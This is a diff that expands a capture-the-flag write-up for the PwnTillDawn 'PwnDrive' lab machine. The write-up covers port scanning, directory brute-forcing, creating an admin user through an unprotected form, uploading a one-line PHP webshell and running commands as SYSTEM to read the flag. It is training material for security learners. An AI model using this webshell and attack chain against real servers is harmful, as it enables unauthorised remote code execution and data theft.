@@ -1,185 +1,419 @@
-# 🛡️ PwnTillDawn - PwnDrive Walkthrough
+# 🛡️ PwnTillDawn — PwnDrive Machine Writeup
 
-## 📌 Overview
-This walkthrough documents the exploitation of the **PwnDrive** machine from PwnTillDawn.  
-The objective is to gain access via web vulnerabilities and enumerate the system.
+> **Platform:** PwnTillDawn Academy  
+> **Target IP:** `10.150.150.11`  
+> **Hostname:** `PwnDrive`  
+> **OS:** Windows Server 2008 R2 / 2012  
+> **Difficulty:** Beginner–Intermediate  
+> **Flag:** `PwnTillDawnAcademyIsAwesome!!!`
 
 ---
 
-## 🔍 Enumeration
+## 📋 Table of Contents
 
-### Nmap Scan
+- [Reconnaissance](#-reconnaissance)
+- [Service Enumeration](#-service-enumeration)
+- [Web Directory Enumeration](#-web-directory-enumeration)
+- [Initial Access — File Upload Bypass](#-initial-access--file-upload-bypass)
+- [Remote Code Execution (Webshell)](#-remote-code-execution-webshell)
+- [Post-Exploitation](#-post-exploitation)
+- [Privilege Escalation](#-privilege-escalation)
+- [Flag](#-flag)
+
+---
+
+## 🔍 Reconnaissance
+
+### Nmap Full Port Scan
+
 ```bash
-nmap -sC -sV <target-ip>
+nmap -sV -sC -p- 10.150.150.11
 ```
 
-### 📸 Nmap Result
-![Nmap Scan](images/nmap.png)
+**Key Results:**
 
-### Open Ports
-- 21/tcp → FTP (Xlight FTPd 3.9)
-- 80/tcp → HTTP (Apache 2.4.46, PHP 7.4.9)
-- 135/tcp → MSRPC
-- 139/tcp → NetBIOS
-- 443/tcp → HTTPS
-- 445/tcp → SMB
-- 3306/tcp → MySQL (MariaDB)
-- 1433/tcp → MSSQL
+| Port | State | Service | Version |
+|------|-------|---------|---------|
+| 21/tcp | open | ftp | Xlight ftpd 3.9 |
+| 80/tcp | open | http | Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9 |
+| 135/tcp | open | msrpc | Microsoft Windows RPC |
+| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
+| 443/tcp | open | ssl/http | Apache httpd 2.4.46 |
+| 445/tcp | open | microsoft-ds | Windows Server 2008 R2 Enterprise SP1 |
+| 1433/tcp | open | ms-sql-s | Microsoft SQL Server 2012 (11.00.2100.00 RTM) |
+| 3306/tcp | open | mysql | MariaDB 5.5.5–10.4.14 |
+| 3389/tcp | open | ms-wbt-server | RDP |
+| 49152–49157/tcp | open | msrpc | Microsoft Windows RPC |
 
----
+**OS Detection:** Windows Server 2008 R2 – 2012  
+**CPE:** `cpe:/o:microsoft:windows`
 
-## 🌐 Web Enumeration
+**HTTP Title:** `PwnDrive - Your Personal Online Storage`  
+**PHPSESSID Cookie:** `httponly` flag NOT set ⚠️
 
-### Directory Brute Force
-```bash
-gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
+**SQL Server Details (Port 1433):**
+```
+Target_Name: PWNDRIVE
+NetBIOS_Domain_Name: PWNDRIVE
+NetBIOS_Computer_Name: PWNDRIVE
+DNS_Domain_Name: PwnDrive
+DNS_Computer_Name: PwnDrive
+Product_Version: 6.1.7601
 ```
 
-### 📸 Gobuster Result
-![Gobuster](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/2f2d2dd10fa1dd6e9df2ce81d7d0ec0f18416878/pwntilldawn%205.png)
-
-### Discovered Paths
-- /admin
-- /upload
-- /components
-- /inc
-- /vendor
+**MariaDB Details (Port 3306):**
+```
+Version: 5.5.5-10.4.14-MariaDB
+Thread ID: 143
+Auth Plugin: mysql_native_password
+```
 
 ---
 
-## 💥 Initial Access (RCE via File Upload)
+## 🌐 Service Enumeration
 
-### Upload PHP Shell
+### Screenshot — Nmap HTTP Info (Port 80)
+
+![nmap-http](pwntilldawn_18.png)
+
+> Apache/2.4.46 (Win64), PHP/7.4.9, HTTP methods: GET HEAD POST OPTIONS  
+> Cookie `PHPSESSID` has `httponly` flag NOT set.
+
+### Screenshot — MSSQL (Port 1433)
+
+![nmap-mssql](pwntilldawn_17.png)
+
+> Microsoft SQL Server 2012 RTM, Service Pack Level: RTM, no post-SP patches applied.
+
+### Screenshot — MariaDB (Port 3306)
+
+![nmap-mariadb](pwntilldawn_16.png)
+
+> MariaDB 5.5.5-10.4.14, SSL cert issued by `PwnDrive`.
+
+### Screenshot — Higher RPC Ports
+
+![nmap-rpc](pwntilldawn_15.png)
+
+> Ports 49152–49157 running Microsoft Windows RPC.
+
+---
+
+## 📁 Web Directory Enumeration
+
+```bash
+gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
+```
+
+### Screenshot — Gobuster Results
+
+![gobuster](pwntilldawn_14.png)
+
+**Notable Directories Found:**
+
+| Path | Status | Notes |
+|------|--------|-------|
+| `/admin/` | 301 | Admin panel — directory listing enabled! |
+| `/upload/` | 301 | File upload storage — directory listing enabled! |
+| `/index.php` | 200 | Main application |
+| `/components/` | 301 | App components |
+| `/css/` | 301 | Stylesheets |
+| `/img/` | 301 | Images |
+| `/inc/` | 301 | Includes |
+| `/utils/` | 301 | Utilities |
+| `/vendor/` | 301 | Third-party libraries |
+
+---
+
+## 🗂️ Admin Panel — Directory Listing
+
+Navigating to `http://10.150.150.11/admin/` revealed an open directory listing:
+
+### Screenshot — `/admin/` Index
+
+![admin-index](pwntilldawn_12.png)
+
+```
+/admin/addedituser.php   2020-11-16  3.4K
+/admin/deleteuser.php    2020-11-16   932
+/admin/manageusers.php   2020-11-16  2.0K
+```
+
+> ⚠️ Admin pages are accessible — no authentication on directory listing itself.
+
+---
+
+## 👤 User Enumeration — Admin Panel
+
+Visiting `/admin/manageusers.php` (after gaining admin access via `testuser`):
+
+### Screenshot — Manage Users
+
+![manage-users](pwntilldawn_10.png)
+
+| Username | Role |
+|----------|------|
+| admin | admin |
+| Chris | user |
+| Linda | user |
+| testuser | admin |
+
+### Screenshot — Create User Form (`addedituser.php`)
+
+![create-user](pwntilldawn_11.png)
+
+> Created a new user `testuser` with role `admin` via `/admin/addedituser.php`.
+
+---
+
+## 📤 Initial Access — File Upload Bypass
+
+After logging in as `testuser` (admin role), the application allows file uploads. The upload functionality does **not properly restrict PHP file types**, allowing a PHP webshell to be uploaded directly.
+
+### PHP Webshell Used
+
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-### 📸 Upload Success
-![Upload](images/upload_success.png)
+> Uploaded as `cmd.php` via the **"Add File"** feature in the PwnDrive UI.
 
-### Access Shell
+### Screenshot — Successful Upload
+
+![file-uploaded](pwntilldawn_9.png)
+
+> `File Uploaded Successfully!` — `cmd.php` is now listed in personal files.
+
+### Screenshot — Upload Directory Listing
+
+Navigating to `http://10.150.150.11/upload/` confirms uploaded files are accessible:
+
+![upload-index](pwntilldawn_13.png)
+
 ```
-http://<target-ip>/upload/11/cmd.php?cmd=whoami
+/upload/2/    2026-04-22 01:16
+/upload/10/   2020-11-16 10:44
 ```
 
-### 📸 RCE (whoami)
-![whoami](images/whoami.png)
+The webshell lands in a numbered user folder, e.g., `/upload/11/cmd.php`:
 
-### Result
+![upload-11](pwntilldawn_8.png)
+
+```
+/upload/11/cmd.php   2024-03-21 06:24   31 bytes
+```
+
+---
+
+## 💻 Remote Code Execution (Webshell)
+
+The uploaded webshell is now executable via the browser URL bar.
+
+**Webshell URL Format:**
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=<COMMAND>
+```
+
+---
+
+### `whoami`
+
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=whoami
+```
+
+#### Screenshot
+
+![whoami](pwntilldawn_7.png)
+
 ```
 nt authority\system
 ```
 
-🔥 The web server is running as SYSTEM → full control achieved
+> ✅ Running as **SYSTEM** — highest privilege on Windows, no further privilege escalation needed!
 
 ---
 
-## 🖥️ Post Exploitation
+### `hostname`
 
-### User Enumeration
-```bash
-net user
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=hostname
 ```
 
-### 📸 Users
-![Users](images/netuser.png)
+#### Screenshot
 
----
+![hostname](pwntilldawn_6.png)
 
-### Directory Enumeration
-
-#### Desktop Flag
-```bash
-dir C:\Users\Administrator\Desktop
 ```
-
-### 📸 Flag Location
-![Flag](images/flag.png)
-
----
-
-#### Users Directory
-```bash
-dir C:\Users
-```
-
-### 📸 Users Folder
-![Users Dir](images/users_dir.png)
-
----
-
-## 📂 Web Application Access
-
-### PwnDrive Dashboard
-```
-http://<target-ip>/myfiles.php
-```
-
-### 📸 Dashboard
-![Dashboard](images/dashboard.png)
-
----
-
-## 🔐 Admin Panel
-
-### Access
-```
-http://<target-ip>/admin/
-```
-
-### 📸 Admin Panel
-![Admin](images/admin_panel.png)
-
----
-
-### Manage Users
-![Manage Users](images/manage_users.png)
-
----
-
-### Create User
-![Create User](images/create_user.png)
-
----
-
-## ⚠️ Vulnerabilities
-
-- Unrestricted file upload → Remote Code Execution
-- No input validation
-- Exposed admin panel
-- Weak access control
-- Service running as SYSTEM (critical misconfiguration)
-
----
-
-## 🏁 Flags
-
-### User Flag
-```
-C:\Users\Administrator\Desktop\FLAG1.txt
+PwnDrive
 ```
 
 ---
 
-## 🎯 Key Takeaways
+### `net user`
 
-- File upload features are critical attack vectors
-- Always perform directory brute forcing
-- Misconfigured services can give immediate SYSTEM access
-- Post-exploitation enumeration is essential
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=net+user
+```
+
+#### Screenshot
+
+![net-user](pwntilldawn_5.png)
+
+```
+User accounts for \\
+Administrator   Guest   Jboden   tony
+The command completed with one or more errors.
+```
 
 ---
 
-## ⚙️ Tools Used
+### `dir C:\Users`
 
-- Nmap
-- Gobuster
-- Browser
-- PHP Web Shell
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users
+```
+
+#### Screenshot
+
+![dir-users](pwntilldawn_4.png)
+
+```
+Directory of C:\Users
+
+Administrator   06/27/2016 02:05 AM
+Classic .NET AppPool   03/28/2020 09:01 AM
+Jboden   06/27/2016 01:58 AM
+MSSQL$SQLEXPRESS   07/13/2009 09:57 PM
+Public   07/16/2020 06:44 AM
+tony
+```
 
 ---
 
-## 👨‍💻 Author
+### `dir C:\Users\Administrator`
 
-**Izzul Harith**  
-Cybersecurity Student | Future Penetration Tester 🔥
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator
+```
+
+#### Screenshot
+
+![dir-admin](pwntilldawn_3.png)
+
+```
+Contacts   11/17/2020 07:19 AM
+Desktop    06/27/2016 12:21 AM
+Documents  08/24/2020 05:59 AM
+Downloads  06/27/2016 12:21 AM
+Favorites  06/27/2016 12:21 AM
+Links      06/27/2016 12:21 AM
+Music      06/27/2016 12:21 AM
+Pictures   06/27/2016 12:21 AM
+Saved Games 06/27/2016 12:21 AM
+Searches   06/27/2016 12:21 AM
+Videos
+```
+
+---
+
+### `dir C:\Users\Administrator\Desktop`
+
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator\Desktop
+```
+
+#### Screenshot
+
+![dir-desktop](pwntilldawn_2.png)
+
+```
+11/17/2020  07:19 AM    .
+11/17/2020  07:20 AM    ..
+11/17/2020  07:20 AM    30  FLAG1.txt
+08/11/2020  08:29 AM   979  Xlight FTP Server.lnk
+
+2 File(s)   1,009 bytes
+2 Dir(s)    21,059,317,760 bytes free
+```
+
+> 🏁 `FLAG1.txt` found on the Administrator's Desktop!
+
+---
+
+## 🏁 Flag
+
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=type+C:\Users\Administrator\Desktop\FLAG1.txt
+```
+
+### Screenshot — Flag
+
+![flag](pwntilldawn_1.png)
+
+```
+PwnTillDawnAcademyIsAwesome!!!
+```
+
+---
+
+## 🗺️ Attack Chain Summary
+
+```
+Nmap Scan
+    │
+    ▼
+Gobuster Dir Enum ──► /admin/ (open directory listing)
+    │
+    ▼
+Access /admin/addedituser.php ──► Create testuser (admin role)
+    │
+    ▼
+Login as testuser ──► Upload cmd.php webshell (no extension filter)
+    │
+    ▼
+Access /upload/11/cmd.php?cmd=whoami ──► nt authority\system
+    │
+    ▼
+dir C:\Users\Administrator\Desktop ──► FLAG1.txt
+    │
+    ▼
+type FLAG1.txt ──► PwnTillDawnAcademyIsAwesome!!!
+```
+
+---
+
+## 🛠️ Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port scan & service enumeration |
+| `gobuster` | Web directory brute-force |
+| Browser | Manual web exploitation |
+| PHP Webshell (`cmd.php`) | Remote code execution |
+
+---
+
+## 🔐 Vulnerabilities Identified
+
+| Vulnerability | Severity | Location |
+|--------------|----------|---------|
+| Unrestricted File Upload (PHP) | Critical | `/upload/` endpoint |
+| Directory Listing Enabled | Medium | `/admin/`, `/upload/` |
+| No Auth on Admin User Creation | Critical | `/admin/addedituser.php` |
+| Web App Running as SYSTEM | Critical | Apache/PHP process |
+| PHPSESSID `httponly` not set | Low | HTTP Cookie |
+| MariaDB & MSSQL Exposed | Medium | Ports 3306, 1433 |
+| Outdated SQL Server (2012 RTM, no patches) | High | Port 1433 |
+
+---
+
+## 📌 Notes
+
+- The web application (PwnDrive) runs under `nt authority\system`, meaning any webshell execution immediately yields SYSTEM-level access — no privilege escalation step required.
+- The `/admin/` panel has no authentication enforcement on the directory listing or user creation form when accessed directly via URL.
+- The file upload feature stores files in a predictable numbered path (`/upload/<user_id>/`) with **direct web access** and **no PHP execution restriction**.
+
+---
+
+*Writeup by: [Your Name] | Platform: PwnTillDawn Academy*
